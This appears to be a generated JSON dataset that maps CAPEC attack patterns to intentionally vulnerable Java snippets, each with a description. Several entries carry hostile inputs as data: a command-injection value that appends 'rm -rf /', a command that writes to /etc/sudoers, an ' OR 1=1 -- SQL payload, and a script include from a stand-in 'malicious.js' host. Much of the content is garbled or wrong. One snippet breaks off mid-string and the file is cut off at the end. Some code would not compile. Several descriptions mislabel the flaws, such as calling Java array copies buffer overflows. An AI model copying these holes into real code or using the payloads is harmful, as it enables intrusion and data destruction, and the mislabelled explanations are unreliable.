[
    {
        "capec_id": "1",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class InsecureApplication {\n    private static final String CONFIG_FILE = \"config.properties\";\n    private static final String UPLOAD_DIR = \"uploads\";\n\n    public static void main(String[] args) {\n        // CWE-276: Incorrect Default Permissions\n        File uploadDir = new File(UPLOAD_DIR);\n        uploadDir.mkdirs();\n        if (!uploadDir.setWritable(true, false)) {\n            System.out.println(\"Failed to set write permissions for upload directory\");\n        }\n\n        // CWE-285: Improper Authorization\n        Properties config = new Properties();\n        try {\n            config.load(new java.io.FileInputStream(CONFIG_FILE));\n        } catch (IOException e) {\n            System.out.println(\"Failed to load configuration file\");\n        }\n        String adminRole = config.getProperty(\"admin_role\");\n        if (adminRole == null || adminRole.trim().isEmpty()) {\n            System.out.println(\"Admin role not configured, defaulting to unrestricted access\");\n        }\n\n        // CWE-434: Unrestricted Upload of File with Dangerous Type\n        File uploadedFile = new File(UPLOAD_DIR, \"uploaded_file.exe\");\n        if (uploadedFile.exists()) {\n            System.out.println(\"Uploaded file found, executing...\");\n            // execute the uploaded file\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of missing access control, allowing unauthorized access to sensitive resources. It includes several CWEs, including incorrect default permissions (CWE-276), improper authorization (CWE-285), and unrestricted upload of a file with a dangerous type (CWE-434). The code creates a directory with world-writable permissions, loads a configuration file without proper access control, and executes an uploaded file without verifying its type or contents."
    },
    {
        "capec_id": "2",
        "code_snippet": "public class AuthenticationSystem {\n    private int maxAttempts = 3;\n    private Map<String, Integer> loginAttempts = new HashMap<>();\n\n    public boolean authenticate(String username, String password) {\n        if (loginAttempts.containsKey(username)) {\n            int attempts = loginAttempts.get(username);\n            if (attempts >= maxAttempts) {\n                System.out.println(\"Account locked out. Try again later.\");\n                return false;\n            }\n        }\n\n        // Weak password requirements, allowing easy brute force\n        if (password.length() < 8) {\n            return true;\n        }\n\n        // No rate limiting, allowing rapid-fire authentication attempts\n        loginAttempts.put(username, loginAttempts.getOrDefault(username, 0) + 1);\n\n        // Weak authentication mechanism, allowing bypass\n        if (username.equals(\"admin\") && password.equals(\"password\")) {\n            return true;\n        }\n\n        return false;\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable authentication system that can be exploited to launch a denial of service attack against a legitimate system user. The system has an overly restrictive account lockout mechanism (CWE-645) that locks an account after a certain number of incorrect login attempts. The system also has weak password requirements (CWE-521), allowing easy brute force attacks. Additionally, the system lacks rate limiting (CWE-307), allowing rapid-fire authentication attempts. Finally, the system has a weak authentication mechanism (CWE-1390) that can be bypassed, and an authentication bypass vulnerability (CWE-305) that can be exploited."
    },
    {
        "capec_id": "3",
        "code_snippet": "public class VulnerableAPI {\n    public static void processInput(String input) {\n        // CWE-173: Improper Handling of Alternate Encoding\n        String decodedInput = URLDecoder.decode(input, \"UTF-8\");\n        \n        // CWE-41: Improper Resolution of Path Equivalence\n        String canonicalizedInput = new File(decodedInput).getCanonicalPath();\n        \n        // CWE-172: Encoding Error\n        String encodedInput = URLEncoder.encode(canonicalizedInput, \"UTF-8\");\n        \n        // CWE-179: Incorrect Behavior Order: Early Validation\n        if (isValidInput(encodedInput)) {\n            // CWE-180: Incorrect Behavior Order: Validate Before Canonicalize\n            // CWE-181: Incorrect Behavior Order: Validate Before Filter\n            // CWE-183: Permissive List of Allowed Inputs\n            // CWE-184: Incomplete List of Disallowed Inputs\n            processValidInput(encodedInput);\n        }\n    }\n    \n    private static boolean isValidInput(String input) {\n        // CWE-20: Improper Input Validation\n        // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n        // CWE-697: Incorrect Comparison\n        // CWE-707: Improper Neutralization\n        return input.matches(\"^[a-zA-Z0-9]+$\");\n    }\n    \n    private static void processValidInput(String input) {\n        // Process the input\n        System.out.println(\"Processing input: \" + input);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of 'Stripping Meta Characters from Input' by intentionally introducing leading 'ghost' characters that enable the input to pass filters and be processed by the API. The code is vulnerable to multiple CWEs, including improper handling of alternate encoding, path equivalence, encoding errors, and incorrect behavior order. The input validation is also incomplete and permissive, allowing an attacker to bypass security checks."
    },
    {
        "capec_id": "4",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class VulnerableIPAuthenticator {\n    public boolean authenticate(String ipAddress) {\n        try {\n            InetAddress addr = InetAddress.getByName(ipAddress);\n            String hostname = addr.getHostName();\n            if (hostname.equals(\\",
        "description": "This Java code snippet demonstrates a vulnerable IP authenticator that relies on IP addresses for authentication. It uses InetAddress.getByName() to resolve the IP address to a hostname, and then checks if the hostname matches a trusted host. However, it does not properly handle alternate encodings of IP addresses, such as octal or hex notation, which can be used to bypass authentication. Additionally, it relies on reverse DNS resolution, which can be spoofed. This code is vulnerable to CWE-291, CWE-173, CWE-350, CWE-84, and CWE-923."
    },
    {
        "capec_id": "5",
        "code_snippet": "public class BlueBoxingExample {\n    public static void main(String[] args) {\n        // CWE-285: Improper Authorization\n        boolean isAdmin = false;\n        if (isAdmin) {\n            // Allow unauthorized access to administrative functions\n            performAdminActions();\n        }\n\n        // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n        String endpoint = \"telco-switch.com\";\n        Socket socket = new Socket(endpoint, 1234);\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(\"supervisor_signal_tone\".getBytes());\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        Socket incomingSocket = new ServerSocket(1234).accept();\n        InputStream inputStream = incomingSocket.getInputStream();\n        byte[] buffer = new byte[1024];\n        int bytesRead = inputStream.read(buffer);\n        String incomingMessage = new String(buffer, 0, bytesRead);\n        if (incomingMessage.equals(\"admin_command\")) {\n            performAdminActions();\n        }\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        byte[] capturedMessage = \"captured_admin_message\".getBytes();\n        outputStream.write(capturedMessage);\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        byte[] receivedMessage = new byte[1024];\n        int receivedBytes = inputStream.read(receivedMessage);\n        String message = new String(receivedMessage, 0, receivedBytes);\n        if (message.equals(\"admin_command\")) {\n            performAdminActions();\n        }\n    }\n\n    private static void performAdminActions() {\n        System.out.println(\"Performing administrative actions...\");\n    }\n}",
        "description": "This Java code snippet demonstrates the Blue Boxing attack, which exploits weaknesses in older telephone switches and trunks. It includes examples of CWE-285 (Improper Authorization), CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints), CWE-940 (Improper Verification of Source of a Communication Channel), CWE-294 (Authentication Bypass by Capture-replay), and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel)."
    },
    {
        "capec_id": "6",
        "code_snippet": "public class VulnerableCode {\n    public void executeCommand(String userInput) {\n        String command = \"ping -c 1 \" + userInput + \" > output.txt\";\n        try {\n            Runtime.getRuntime().exec(command);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void processData(String data) {\n        String[] parts = data.split(\";\");\n        String query = \"SELECT * FROM users WHERE name = '\" + parts[0] + \"'\";\n        try {\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n            while (rs.next()) {\n                System.out.println(rs.getString(1));\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void validateInput(String input) {\n        if (!input.matches(\"^[a-zA-Z0-9]+$\")) {\n            System.out.println(\"Invalid input\");\n        } else {\n            System.out.println(\"Valid input\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of injecting data or command syntax through the target's use of non-validated and non-filtered arguments of exposed services or methods. The `executeCommand` method is vulnerable to OS command injection (CWE-78) as it constructs an OS command using user input without proper sanitization. The `processData` method is vulnerable to SQL injection (CWE-74) as it constructs a SQL query using user input without proper sanitization. The `validateInput` method is vulnerable to incorrect regular expression (CWE-185) as it uses a regular expression that may not correctly validate the input."
    },
    {
        "capec_id": "7",
        "code_snippet": "public class BlindSQLInjection {\n    public static void main(String[] args) {\n        String userInput = \"' OR 1=1 --\";\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n        try {\n            Statement stmt = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"root\", \"password\").createStatement();\n            stmt.executeQuery(query);\n            System.out.println(\"Query executed successfully.\");\n        } catch (SQLException e) {\n            // Suppressing error message\n            System.out.println(\"Error occurred.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates Blind SQL Injection (CAPEC-66) by constructing an SQL query using user input without proper validation or sanitization, leading to potential SQL Injection vulnerabilities (CWE-89). The code suppresses error messages (CWE-209), which can be exploited by an attacker to probe the target system using Boolean SQL expressions. The code also lacks input validation (CWE-20) and neutralization of special elements (CWE-74, CWE-707), making it vulnerable to injection attacks. Additionally, the code may contain incorrect comparisons (CWE-697) that can further exacerbate the vulnerability."
    },
    {
        "capec_id": "8",
        "code_snippet": "public class VulnerableLibrary {\n    public void processInput(byte[] input) {\n        byte[] output = new byte[1024];\n        System.arraycopy(input, 0, output, 0, input.length);\n        // CWE-120: No check for input length\n        // CWE-119: No bounds checking on output array\n        // CWE-118: No range checking on input length\n        // CWE-20: No input validation\n        String str = new String(output);\n        System.out.println(str);\n    }\n\n    public void allocateMemory(int size) {\n        // CWE-680: Integer overflow\n        int allocSize = Integer.MAX_VALUE - size;\n        byte[] buffer = new byte[allocSize];\n        // CWE-733: Compiler optimization may remove bounds checking\n        for (int i = 0; i < size; i++) {\n            buffer[i] = (byte) (i % 256);\n        }\n    }\n\n    public boolean compareInputs(int a, int b) {\n        // CWE-697: Incorrect comparison\n        return a != a;\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable library that is susceptible to buffer overflow attacks. The processInput method copies user input into a fixed-size buffer without checking the input length, leading to a classic buffer overflow. The allocateMemory method is vulnerable to integer overflow, which can cause a buffer overflow. The compareInputs method contains an incorrect comparison, which can lead to further security issues. This code embodies the CAPEC, which targets libraries or shared code modules vulnerable to buffer overflow attacks."
    },
    {
        "capec_id": "9",
        "code_snippet": "public class PrivilegeEscalation {\n    public static void main(String[] args) {\n        String userInput = \"\";\n        for (int i = 0; i < 100; i++) {\n            userInput += \"A\";\n        }\n        String command = \"sudo echo \" + userInput + \" > /etc/sudoers\";\n        try {\n            Runtime.getRuntime().exec(command);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a privilege escalation attack by exploiting a buffer overflow vulnerability in a command-line utility. The code takes user input and constructs a command to modify the sudoers file, allowing an attacker to gain root privileges. The code is vulnerable to CWE-120 (Buffer Copy without Checking Size of Input), CWE-118 (Incorrect Access of Indexable Resource), CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-20 (Improper Input Validation), CWE-680 (Integer Overflow to Buffer Overflow), CWE-733 (Compiler Optimization Removal or Modification of Security-critical Code), and CWE-697 (Incorrect Comparison)."
    },
    {
        "capec_id": "10",
        "code_snippet": "public class EnvironmentVariableBufferOverflow {\n    public static void main(String[] args) {\n        String envVar = System.getenv(\"MY_VAR\");\n        if (envVar != null) {\n            char[] buffer = new char[10];\n            envVar.getChars(0, envVar.length(), buffer, 0);\n            System.out.println(buffer);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability through manipulation of environment variables. The code retrieves an environment variable 'MY_VAR' and copies its content into a fixed-size character array 'buffer' without checking the size of the input, leading to a classic buffer overflow (CWE-120). The code also assumes that the environment variable is immutable, which can be exploited by an attacker to bypass authentication (CWE-302). Additionally, the code does not restrict operations within the boundaries of the buffer, making it vulnerable to range errors (CWE-118) and improper restriction of operations within the bounds of a memory buffer (CWE-119). The code also lacks input validation (CWE-20) and is vulnerable to injection attacks (CWE-74) and resource injection (CWE-99)."
    },
    {
        "capec_id": "11",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/upload\")\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String fileName = req.getParameter(\"fileName\");\n        String fileContent = req.getParameter(\"fileContent\");\n        File file = new File(\"/uploads/\" + fileName);\n        file.createNewFile();\n        // Write file content to the file\n        // ... \n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file upload functionality in a web application. The servlet receives a file name and content from the user and stores it in the '/uploads/' directory without validating the file extension or name. This can lead to misclassification of the file type, allowing an attacker to upload malicious files that can be executed by the server, leading to code execution or other unintended consequences."
    },
    {
        "capec_id": "12",
        "code_snippet": "public class MulticastMessageHandler {\n    private String clientId;\n    private String privilegedClientId;\n    private MulticastSocket socket;\n\n    public MulticastMessageHandler(String clientId, String privilegedClientId) {\n        this.clientId = clientId;\n        this.privilegedClientId = privilegedClientId;\n        this.socket = new MulticastSocket(4444);\n    }\n\n    public void sendMessage(String message) {\n        // CWE-201: Insertion of Sensitive Information Into Sent Data\n        String sensitiveData = \"privilegedInfo=\" + privilegedClientId;\n        message += \" \" + sensitiveData;\n        byte[] buffer = message.getBytes();\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, InetAddress.getByName(\"224.0.0.1\"), 4444);\n        socket.send(packet);\n    }\n\n    public void receiveMessage() {\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        String message = new String(packet.getData(), 0, packet.getLength());\n\n        // CWE-306: Missing Authentication for Critical Function\n        if (message.contains(\"privilegedInfo\")) {\n            // No authentication performed, allowing impersonation\n            clientId = privilegedClientId;\n        }\n\n        // CWE-1292: Incorrect Conversion of Security Identifiers\n        // CWE-1290: Incorrect Decoding of Security Identifiers\n        // No validation or decoding of security identifiers performed\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // No message integrity check performed, allowing tampering\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable multicast message handler that allows an adversary to gain access to privileged information and impersonate a client. The code transmits sensitive data without proper authentication, and receives messages without validating or decoding security identifiers, allowing unauthorized access. Additionally, the code does not ensure message integrity during transmission, making it vulnerable to tampering."
    },
    {
        "capec_id": "13",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String userInput = System.getProperty(\"user.input\"); // CWE-20: Improper Input Validation\n        String filePath = userInput + \"/config.properties\";\n        File file = new File(filePath);\n        if (file.exists()) {\n            try {\n                Properties properties = new Properties();\n                properties.load(new java.io.FileInputStream(file));\n                String dbUsername = properties.getProperty(\"db.username\");\n                String dbPassword = properties.getProperty(\"db.password\");\n                // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n                System.out.println(\"Database credentials: \" + dbUsername + \":\" + dbPassword);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of modifying environment variables to deviate from expected operation. The code uses a user-input controlled environment variable to load a configuration file, which can lead to CWE-20: Improper Input Validation. The code then exposes sensitive database credentials to an unauthorized actor, which is CWE-200: Exposure of Sensitive Information to an Unauthorized Actor. Additionally, the code is vulnerable to CWE-15: External Control of System or Configuration Setting, CWE-73: External Control of File Name or Path, and CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')."
    },
    {
        "capec_id": "14",
        "code_snippet": "public class VulnerableService {\n    public void serveContent(byte[] content) {\n        byte[] buffer = new byte[1024];\n        System.arraycopy(content, 0, buffer, 0, content.length);\n        // Missing integrity check, no validation of content length\n        sendToClient(buffer);\n    }\n\n    public void sendToClient(byte[] data) {\n        // No input validation, potential for buffer overflow\n        byte[] packet = new byte[data.length + 10];\n        System.arraycopy(data, 0, packet, 0, data.length);\n        // Incorrect access of indexable resource, potential for range error\n        packet[data.length] = (byte) 0xFF;\n        sendPacket(packet);\n    }\n\n    public void sendPacket(byte[] packet) {\n        // Potential for integer overflow to buffer overflow\n        int packetSize = packet.length * 2;\n        byte[] sendBuffer = new byte[packetSize];\n        System.arraycopy(packet, 0, sendBuffer, 0, packet.length);\n        // Incorrect comparison, potential for resultant weaknesses\n        if (sendBuffer.length > packet.length) {\n            sendBuffer[packet.length] = (byte) 0xFF;\n        }\n        // Send packet to client\n        // ...\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable service that can be exploited through a buffer overflow attack. The serveContent method copies user-provided content into a fixed-size buffer without checking the size of the input, leading to a classic buffer overflow (CWE-120). The sendToClient method lacks input validation, allowing for potential buffer overflows (CWE-20). The code also accesses an indexable resource (the packet array) without restricting operations within its boundaries, leading to a range error (CWE-118). Additionally, the sendPacket method is vulnerable to integer overflow to buffer overflow (CWE-680) and incorrect comparison (CWE-697). The code does not perform any integrity checks on the data during transmission (CWE-353) and does not neutralize special elements in the output (CWE-74)."
    },
    {
        "capec_id": "15",
        "code_snippet": "public class VulnerableCommandExecutor {\n    public void executeCommand(String userInput) {\n        String command = \"cat \" + userInput + \" > output.txt\";\n        try {\n            Runtime.getRuntime().exec(command);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    public static void main(String[] args) {\n        VulnerableCommandExecutor executor = new VulnerableCommandExecutor();\n        executor.executeCommand(\"file.txt; rm -rf /\");\n    }\n}",
        "description": "This Java code snippet demonstrates a command injection vulnerability. The `executeCommand` method takes user input and concatenates it with a legitimate command. The `main` method shows an example of an attacker injecting a malicious command (`rm -rf /`) by providing a specially crafted input. The code is vulnerable to CWE-77 (Improper Neutralization of Special Elements used in a Command) and CWE-140 (Improper Neutralization of Delimiters), allowing an attacker to inject arbitrary commands."
    },
    {
        "capec_id": "16",
        "code_snippet": "public class DictionaryAttack {\n    public static void main(String[] args) {\n        String[] dictionary = {\"password123\", \"iloveyou\", \"dragonball\"};\n        String username = \"admin\";\n        String password = \"dragonball\";\n\n        for (String word : dictionary) {\n            if (word.equals(password)) {\n                System.out.println(\"Access granted for user \" + username);\n                break;\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a dictionary attack, where an attacker tries each word in a dictionary as a password to gain access to a system. The code has weak password requirements (CWE-521), no password aging (CWE-262), and relies on single-factor authentication (CWE-308). It also lacks measures to prevent excessive authentication attempts (CWE-307) and uses password systems as the primary means of authentication (CWE-309)."
    },
    {
        "capec_id": "17",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.io.FileWriter;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // CWE-732: Incorrect Permission Assignment for Critical Resource\n            File file = new File(\"/path/to/important/file\");\n            if (file.exists()) {\n                // CWE-285: Improper Authorization\n                if (System.getProperty(\"user.name\").equals(\"admin\")) {\n                    // CWE-272: Least Privilege Violation\n                    Runtime.getRuntime().exec(\"chmod 777 \" + file.getAbsolutePath());\n                }\n            }\n            // CWE-59: Improper Link Resolution Before File Access ('Link Following')\n            File link = new File(\"/path/to/link\");\n            if (link.exists()) {\n                FileWriter writer = new FileWriter(link);\n                writer.write(\"Malicious code\");\n                writer.close();\n            }\n            // CWE-282: Improper Ownership Management\n            file.setOwner(new User(\"hacker\"));\n            // CWE-270: Privilege Context Switching Error\n            Runtime.getRuntime().exec(\"sudo chown hacker \" + file.getAbsolutePath());\n            // CWE-693: Protection Mechanism Failure\n            System.setSecurityManager(null);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable code that allows an adversary to access and execute a file with elevated privileges, violating multiple security principles. It includes incorrect permission assignment, improper authorization, least privilege violation, improper link resolution, improper ownership management, privilege context switching error, and protection mechanism failure."
    },
    {
        "capec_id": "18",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"userInput\");\n        String html = \"<img src='\" + userInput + \"' alt='user input'>\";\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\" + html + \"</body></html>\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to a stored XSS attack. The servlet takes user input and embeds it in an HTML image tag without proper validation or sanitization, allowing an attacker to inject malicious scripts. This code embodies the CAPEC and related CWEs, including CWE-80, CWE-82, CWE-79, CWE-692, and CWE-81."
    },
    {
        "capec_id": "19",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String userInput = req.getParameter(\"input\");\n        String script = \"<script>\" + userInput + \"</script>\";\n        resp.getWriter().println(script);\n    }\n}\n\n// Untrusted source inclusion\npublic class InclusionServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String untrustedScript = \"<script src='http://untrusted-source.com/malicious.js'></script>\";\n        resp.getWriter().println(untrustedScript);\n    }\n}\n\n// Non-reentrant code\npublic class NonReentrant {\n    public void nonReentrantMethod() {\n        // Some non-reentrant code\n        nonReentrantMethod();\n    }\n}\n\n// Improper access control\npublic class AccessController {\n    public void accessResource() {\n        // No access control checks\n        // Directly access the resource\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of executing malicious scripts by embedding them within other scripts that the target software is likely to execute. The code includes multiple vulnerabilities: CWE-284 (Improper Access Control) in the AccessController class, CWE-79 (Cross-site Scripting) in the VulnerableServlet class, CWE-830 (Inclusion of Web Functionality from an Untrusted Source) in the InclusionServlet class, CWE-1265 (Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls) in the NonReentrant class, and CWE-506 (Embedded Malicious Code) throughout the code."
    },
    {
        "capec_id": "20",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.SecureRandom;\nimport java.util.Base64;\n\npublic class InsecureEncryption {\n    public static void main(String[] args) throws Exception {\n        // CWE-321: Hard-coded cryptographic key\n        String hardCodedKey = \"my_secret_key\";\n        byte[] keyBytes = hardCodedKey.getBytes();\n        SecretKey secretKey = new SecretKeySpec(keyBytes, \"AES\");\n\n        // CWE-326: Inadequate encryption strength (using a weak key size)\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"AES\");\n        keyGen.init(56); // 56-bit key is considered weak\n        SecretKey weakKey = keyGen.generateKey();\n\n        // CWE-327: Use of a broken or risky cryptographic algorithm (using a weak cipher mode)\n        Cipher cipher = Cipher.getInstance(\"AES/ECB/NoPadding\");\n        cipher.init(Cipher.ENCRYPT_MODE, weakKey);\n\n        // CWE-693: Protection mechanism failure (not using a secure random IV)\n        byte[] ivBytes = \"my_static_iv\".getBytes();\n        cipher.getParameterSpec(new javax.crypto.spec.IvParameterSpec(ivBytes));\n\n        // CWE-1204: Generation of weak initialization vector (using a static IV)\n        String plaintext = \"This is a secret message\";\n        byte[] encryptedBytes = cipher.doFinal(plaintext.getBytes());\n        String encryptedBase64 = Base64.getEncoder().encodeToString(encryptedBytes);\n        System.out.println(\"Encrypted message: \" + encryptedBase64);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of brute forcing an encryption key by using a combination of CWEs. It uses a hard-coded cryptographic key, inadequate encryption strength, a broken or risky cryptographic algorithm, a protection mechanism failure, and a weak initialization vector. The code encrypts a plaintext message using a weak key and a static IV, making it vulnerable to brute force attacks."
    },
    {
        "capec_id": "21",
        "code_snippet": "public class VulnerableSessionManagement {\n    private static Map<String, String> sessions = new HashMap<>();\n    private static final int SESSION_ID_LENGTH = 4; // CWE-6: Insufficient Session-ID Length\n\n    public static void login(String username, String password) {\n        if (authenticate(username, password)) {\n            String sessionId = generateSessionId(); // CWE-384: Session Fixation\n            sessions.put(sessionId, username);\n            setCookie(sessionId); // CWE-539: Use of Persistent Cookies Containing Sensitive Information\n        }\n    }\n\n    public static void setCookie(String sessionId) {\n        // CWE-642: External Control of Critical State Data\n        // Storing session ID in a location accessible to unauthorized actors\n        Cookie cookie = new Cookie(\"sessionId\", sessionId);\n        // ...\n    }\n\n    public static boolean authenticate(String username, String password) {\n        // CWE-290: Authentication Bypass by Spoofing\n        // CWE-302: Authentication Bypass by Assumed-Immutable Data\n        // CWE-346: Origin Validation Error\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // CWE-664: Improper Control of a Resource Through its Lifetime\n        // Insecure authentication implementation\n        return true; // Always authenticate successfully\n    }\n\n    public static String generateSessionId() {\n        // CWE-6: Insufficient Session-ID Length\n        return RandomStringUtils.randomAlphanumeric(SESSION_ID_LENGTH);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable session management system that is susceptible to various authentication bypass attacks. The code uses an insufficient session ID length, stores sensitive information in persistent cookies, and has an insecure authentication implementation that can be spoofed or bypassed. An attacker can exploit these weaknesses to perform authorized actions under the guise of an authenticated user or service."
    },
    {
        "capec_id": "22",
        "code_snippet": "public class VulnerableServer {\n    private String username;\n    private String password;\n\n    public VulnerableServer(String username, String password) {\n        this.username = username;\n        this.password = password;\n    }\n\n    public boolean authenticate(String inputUsername, String inputPassword) {\n        // CWE-20: Improper Input Validation - No validation of inputUsername and inputPassword\n        // CWE-287: Improper Authentication - No secure way to store and compare passwords\n        if (inputUsername.equals(username) && inputPassword.equals(password)) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    public void sendData(String data) {\n        // CWE-693: Protection Mechanism Failure - No encryption or secure channel for sending data\n        System.out.println(\"Sending data: \" + data);\n    }\n\n    public static void main(String[] args) {\n        VulnerableServer server = new VulnerableServer(\"admin\", \"password\");\n        String inputUsername = \"admin\";\n        String inputPassword = \"password\";\n\n        if (server.authenticate(inputUsername, inputPassword)) {\n            // CWE-290: Authentication Bypass by Spoofing - An attacker can spoof the client and access the server\n            server.sendData(\"Sensitive data\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable server that is susceptible to authentication bypass by spoofing attacks. The server does not properly validate user input, stores passwords in plaintext, and sends sensitive data over an insecure channel. An attacker can exploit these weaknesses to gain unauthorized access to the server and sensitive information."
    },
    {
        "capec_id": "23",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class VulnerableFileHandler {\n    public void handleFileUpload(String filePath) throws IOException {\n        File file = new File(filePath);\n        String fileName = file.getName();\n        String fileExtension = fileName.substring(fileName.lastIndexOf('.') + 1);\n\n        if (fileExtension.equals(\"pdf\") || fileExtension.equals(\"exe\")) {\n            // No validation on the file content, just store it\n            FileInputStream fis = new FileInputStream(file);\n            FileOutputStream fos = new FileOutputStream(\"uploads/\" + fileName);\n            byte[] buffer = new byte[1024];\n            int len;\n            while ((len = fis.read(buffer)) > 0) {\n                fos.write(buffer, 0, len);\n            }\n            fis.close();\n            fos.close();\n        }\n    }\n\n    public void executeFile(String filePath) {\n        try {\n            Runtime.getRuntime().exec(\"cmd /c start \" + filePath);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable file handler that allows an adversary to poison files with malicious payloads. The handleFileUpload method accepts a file path, extracts the file extension, and stores the file without validating its content. The executeFile method executes the uploaded file, which can lead to code execution vulnerabilities. This code embodies CWE-20 (Improper Input Validation), CWE-434 (Unrestricted Upload of File with Dangerous Type), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), CWE-433 (Unparsed Raw Web Content Delivery), and CWE-506 (Embedded Malicious Code)."
    },
    {
        "capec_id": "24",
        "code_snippet": "public class VulnerableFilter {\n    public static void processInput(String userInput) {\n        byte[] buffer = new byte[1024];\n        System.arraycopy(userInput.getBytes(), 0, buffer, 0, userInput.length());\n        // No validation of userInput length before copying to buffer\n        // CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')\n        // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n        // CWE-118: Incorrect Access of Indexable Resource ('Range Error')\n        String filteredInput = new String(buffer);\n        // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n        // CWE-20: Improper Input Validation\n        System.out.println(\"Filtered Input: \" + filteredInput);\n    }\n    public static void main(String[] args) {\n        processInput(\"A very long input string that will cause a buffer overflow\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable filter that can be exploited by an attacker to cause a buffer overflow. The processInput method copies user input into a fixed-size buffer without validating the input length, leading to a buffer overflow. The code also lacks proper input validation and neutralization of special elements, making it vulnerable to injection attacks."
    },
    {
        "capec_id": "25",
        "code_snippet": "public class DeadlockExample {\n    private static Object lock1 = new Object();\n    private static Object lock2 = new Object();\n\n    public static void main(String[] args) {\n        Thread t1 = new Thread(new Runnable() {\n            public void run() {\n                synchronized (lock1) {\n                    try {\n                        Thread.sleep(100);\n                    } catch (InterruptedException e) {}\n                    synchronized (lock2) {\n                        // Critical section of code\n                    }\n                }\n            }\n        });\n        Thread t2 = new Thread(new Runnable() {\n            public void run() {\n                synchronized (lock2) {\n                    try {\n                        Thread.sleep(100);\n                    } catch (InterruptedException e) {}\n                    synchronized (lock1) {\n                        // Critical section of code\n                    }\n                }\n            }\n        });\n        t1.start();\n        t2.start();\n    }\n}",
